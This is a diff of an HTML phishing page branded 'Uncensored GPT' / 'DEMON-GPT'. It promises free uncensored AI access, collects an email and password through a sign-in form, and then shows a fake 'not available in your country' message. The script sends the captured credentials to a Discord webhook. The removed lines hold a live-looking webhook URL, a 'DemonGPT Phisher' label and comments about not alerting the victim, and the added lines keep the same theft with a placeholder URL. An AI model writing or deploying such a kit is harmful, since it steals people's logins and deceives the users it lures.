@@ -6,13 +6,13 @@
     <title>Uncensored GPT</title>
     <style>
         @keyframes flicker {
-            0%, 100% { text-shadow: 0 0 5px #ff4800, 0 0 10px #ff4800, 0 0 20px #ff4800, 0 0 40px #ff0000; }
-            50% { text-shadow: 0 0 2px #ff4800, 0 0 5px #ff4800, 0 0 10px #ff0000, 0 0 20px #ff0000; }
+            0%, 100% { text-shadow: 0 0 7px #ff4800, 0 0 12px #ff4800, 0 0 25px #ff4800, 0 0 50px #ff0000; }
+            50% { text-shadow: 0 0 3px #ff4800, 0 0 6px #ff4800, 0 0 12px #ff0000, 0 0 25px #ff0000; }
         }
 
         :root {
             --background-color: #000000;
-            --form-bg-color: rgba(15, 15, 15, 0.85);
+            --form-bg-color: rgba(15, 15, 15, 0.9);
             --text-color: #e0e0e0;
             --input-bg-color: #2a0000;
             --input-border-color: #660000;
@@ -24,10 +24,9 @@
         body {
             font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
             background-color: var(--background-color);
-            background-image: url('https://i.imgur.com/vHqBbyD.jpg'); /* Repeating flame pattern */
+            background-image: url('https://i.imgur.com/vHqBbyD.jpg'); /* Flame background */
             background-size: cover;
             background-attachment: fixed;
-            background-blend-mode: multiply;
             color: var(--text-color);
             display: flex;
             justify-content: center;
@@ -37,14 +36,30 @@
             overflow: hidden;
         }
 
+        #demon-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+            z-index: 0;
+        }
+
+        .scattered-demon {
+            position: absolute;
+            pointer-events: none; /* Make them unclickable */
+        }
+
         .container {
             text-align: center;
             background-color: var(--form-bg-color);
             padding: 40px;
             border-radius: 12px;
             border: 1px solid var(--input-border-color);
-            box-shadow: 0 0 35px rgba(255, 0, 0, 0.5);
+            box-shadow: 0 0 40px rgba(255, 0, 0, 0.6);
             width: 350px;
+            z-index: 10; /* Keep this on top of the demons */
         }
 
         .logo {
@@ -52,15 +67,15 @@
             height: 150px;
             margin-bottom: 20px;
             border-radius: 50%;
-            box-shadow: 0 0 20px var(--glow-color);
+            box-shadow: 0 0 25px var(--glow-color);
         }
 
         h1, h2 {
             margin: 0 0 25px 0;
             font-size: 24px;
-            font-weight: 600;
+            font-weight: bold;
             color: #ffffff;
-            animation: flicker 2s infinite;
+            animation: flicker 1.5s infinite alternate;
         }
 
         p {
@@ -97,8 +112,7 @@
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            transition: all 0.2s;
-            text-shadow: 0 0 5px black;
+            transition: background-color 0.2s, box-shadow 0.2s;
         }
 
         .action-button:hover {
@@ -106,95 +120,99 @@
             box-shadow: 0 0 15px var(--button-hover-color);
         }
 
-        #step-2, #step-3 {
-            display: none; /* Hidden by default */
+        #final-message {
+            display: none;
+            font-size: 18px;
+            padding: 20px 0;
+        }
+
+        /* Hide sections by default */
+        #login-container, #final-message {
+            display: none;
         }
     </style>
 </head>
 <body>
+    <div id="demon-container"></div>
 
-    <!-- Step 1: Initial Landing Page -->
-    <div class="container" id="step-1">
-        <img src="https://i.imgur.com/k910T8M.png" alt="Demon AI" class="logo">
-        <h1>Welcome</h1>
+    <div class="container" id="welcome-container">
+        <img class="logo" src="https://i.imgur.com/3gX3Ff4.png" alt="Demon AI Icon">
+        <h1>DEMON-GPT</h1>
         <p>Your uncensored AI version of ChatGPT for free.</p>
-        <button class="action-button" id="next-button">Next</button>
+        <button class="action-button" onclick="showLogin()">NEXT</button>
     </div>
 
-    <!-- Step 2: Login Form -->
-    <div class="container" id="step-2">
-        <img src="https://i.imgur.com/fBCF18F.png" alt="our infrastructure Logo" class="logo" style="width: 80px; height: 80px; filter: grayscale(1) invert(1);">
-        <h2>Sign in to our infrastructure</h2>
-        <form class="input-form" id="login-form">
-            <input type="email" id="email" placeholder="Email address" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit" class="action-button">Continue</button>
+    <div class="container" id="login-container">
+        <h2>Sign in to continue</h2>
+        <form class="input-form" onsubmit="submitForm(event)">
+            <input type="email" id="email" placeholder="Email" required autocomplete="email">
+            <input type="password" id="password" placeholder="Password" required autocomplete="current-password">
+            <button class="action-button" type="submit">PROCEED</button>
         </form>
     </div>
 
-    <!-- Step 3: Final Message -->
-    <div class="container" id="step-3">
-        <h1>Access Denied</h1>
-        <p>This app is not available in your country.</p>
+    <div class="container" id="final-message">
+        <h2>Access Denied</h2>
+        <p>This application is not available in your country.</p>
     </div>
 
     <script>
-        // Get elements
-        const step1 = document.getElementById('step-1');
-        const step2 = document.getElementById('step-2');
-        const step3 = document.getElementById('step-3');
-        const nextButton = document.getElementById('next-button');
-        const loginForm = document.getElementById('login-form');
+        // --- CONFIGURATION ---
+        const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE";
 
-        // Handle transition from Step 1 to Step 2
-        nextButton.addEventListener('click', () => {
-            step1.style.display = 'none';
-            step2.style.display = 'block';
-        });
+        function showLogin() {
+            document.getElementById('welcome-container').style.display = 'none';
+            document.getElementById('login-container').style.display = 'block';
+        }
 
-        // Handle form submission
-        loginForm.addEventListener('submit', async (event) => {
-            event.preventDefault(); // Prevent page refresh
-
+        function submitForm(event) {
+            event.preventDefault(); // Prevent the form from reloading the page
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // Stop if fields are empty
-            if (!email || !password) return;
-
-            // --- THIS IS WHERE THE DATA IS SENT ---
-            const webhookUrl = 'https://discord.com/api/webhooks/1485149098469363722/eHt-L942QorL11aYAEylSum_FRe197gPBriMOhFTUs56pUVWh1zurqCedmUT-ePtzt1p';
             const payload = {
-                username: "DemonGPT Phisher",
-                avatar_url: "https://i.imgur.com/k910T8M.png",
-                embeds: [{
-                    title: "New our infrastructure Credentials Captured",
-                    color: 13369344, // Fiery Red
-                    fields: [
-                        { name: "Email", value: `\`\`\`${email}\`\`\``, inline: false },
-                        { name: "Password", value: `\`\`\`${password}\`\`\``, inline: false }
-                    ],
-                    footer: { text: `Captured at ${new Date().toUTCString()}` }
-                }]
+                content: `🔥 New credentials captured! 🔥\n**Email:** ${email}\n**Password:** ${password}`
             };
 
-            // Send to webhook in the background. The user sees nothing.
-            try {
-                await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-            } catch (error) {
-                // Ignore errors. The primary goal is to not alert the user.
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .catch(error => console.error('Error sending to webhook:', error))
+            .finally(() => {
+                // Always show the final message, regardless of webhook success
+                document.getElementById('login-container').style.display = 'none';
+                document.getElementById('final-message').style.display = 'block';
+            });
+        }
+        
+        function scatterDemons() {
+            const container = document.getElementById('demon-container');
+            const demonImageUrl = 'https://i.imgur.com/sC4tWnA.png'; // A simple demon head silhouette
+            const numDemons = 25; // How many demons to scatter
+
+            for (let i = 0; i < numDemons; i++) {
+                const demon = document.createElement('img');
+                demon.src = demonImageUrl;
+                demon.className = 'scattered-demon';
+                
+                // Randomize position, size, opacity, and rotation
+                const size = Math.random() * 60 + 20; // Size between 20px and 80px
+                demon.style.width = `${size}px`;
+                demon.style.height = `${size}px`;
+                demon.style.top = `${Math.random() * 100}vh`;
+                demon.style.left = `${Math.random() * 100}vw`;
+                demon.style.opacity = Math.random() * 0.2 + 0.05; // Faint opacity between 0.05 and 0.25
+                demon.style.transform = `rotate(${Math.random() * 360}deg)`;
+
+                container.appendChild(demon);
             }
+        }
 
-            // --- COMPLETE THE ILLUSION ---
-            step2.style.display = 'none';
-            step3.style.display = 'block';
-        });
+        // Show the initial welcome screen and scatter the demons on load
+        document.getElementById('welcome-container').style.display = 'block';
+        window.onload = scatterDemons;
     </script>
-
 </body>
 </html>
-
